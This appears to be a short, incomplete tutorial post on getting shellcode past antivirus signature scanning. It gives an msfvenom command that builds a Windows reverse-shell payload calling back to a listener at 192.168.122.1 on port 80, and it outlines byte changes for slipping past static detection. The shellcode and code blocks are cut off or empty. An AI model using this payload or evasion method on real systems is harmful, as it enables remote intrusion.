# Antivirus Evasion - Part 1

Antivirus Software uses couple of techniques for code detection namely:

- Signature Static Scanning
- Behaiour Monitoring
- Run-time analysis
- AI detection and many other tricks.

## Bypassing Signature Static Scanning

We can change some byte to bypass static scanning. Original idea was showed by [ired teams](https://www.ired.team/offensive-security/defense-evasion/evading-windows-defender-using-classic-c-shellcode-launcher-with-1-byte-change) but this, as stated by them, this trick soon became obselete since windows does detect the shellcode statically.

#### Steps

- Generate msf shellcode using normal procedure.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.1 LPORT=80 -f csharp
```
Shellcode : 
```text
byte[] buf = new byte[324] {

- Performed various changes to shellcode to avoid static shellcode detection. Althought the below code wont pass run time analysis of defender but it does bypass latest static based signature detection. Again, I could have used something else but main purpose was to code stuff to lean c# and windows also :)

Code:

(The above code is for 32 bit. It would show overflow if ran in 64 bit since its uses UInt32)

### Pre-Requistes

- Below are the structures of the functions imported by kernel32.dll taken directly from Microsoft.
